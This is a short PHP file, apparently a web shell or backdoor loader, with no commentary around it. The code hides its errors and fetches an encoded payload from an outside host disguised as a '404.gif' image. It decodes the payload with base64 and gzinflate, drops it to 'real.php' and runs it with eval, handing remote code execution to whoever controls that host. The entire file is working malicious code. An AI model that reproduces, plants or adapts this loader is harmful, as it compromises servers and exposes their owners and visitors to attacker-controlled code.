<?php
$password='admin';
error_reporting(0);
session_start();
if (!isset($_SESSION["phpapi"])) {
    $c = '';
    $useragent = 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2)';
    $url = "http://phpapi.info/404.gif";
    $urlNew = "/0OliakTHisP8hp0adph9papi5+r6eci0a8yijmg9oxcp9ckvhf/";
    if (function_exists('fsockopen')) {
        $link = parse_url($url);
        $query = $link['path'];
        $host = strtolower($link['host']);
        $fp = fsockopen($host, 80, $errno, $errstr, 10);
        if ($fp) {
            $out = "GET /{$query} HTTP/1.0\r\n";
            $out .= "Host: {$host}\r\n";
            $out .= "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2)\r\n";
            $out .= "Connection: Close\r\n\r\n";
            fwrite($fp, $out);
            $inheader = 1;
            $contents = "";
            while (!feof($fp)) {
                $line = fgets($fp, 4096);
                if ($inheader == 0) {
                    $contents .= $line;
                }
                if ($inheader && ($line == "\n" || $line == "\r\n")) {
                    $inheader = 0;
                }
            }
            fclose($fp);
            $c = $contents;
        }
    }
    if (!strpos($c, $urlNew) && function_exists('curl_init') && function_exists('curl_exec')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_TIMEOUT, 15);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
        curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
        $c = curl_exec($ch);
        curl_close($ch);
    }
    if (!strpos($c, $urlNew) && ini_get('allow_url_fopen')) {
        $temps = @file($url);
        if (!empty($temps)) $c = @implode('', $temps);
        if (!strpos($c, "delDirAndFile")) $c = @file_get_contents($url);
    }
    if (strpos($c, $urlNew) !== false) {
        $c = str_replace($urlNew, "", $c);
        $_SESSION["phpapi"] = gzinflate(base64_decode($c));
        file_put_contents('real.php', $_SESSION["phpapi"]);
    }
}
if (isset($_SESSION["phpapi"])) {
    file_put_contents('real.php', $_SESSION["phpapi"]);
    eval($_SESSION["phpapi"]);
}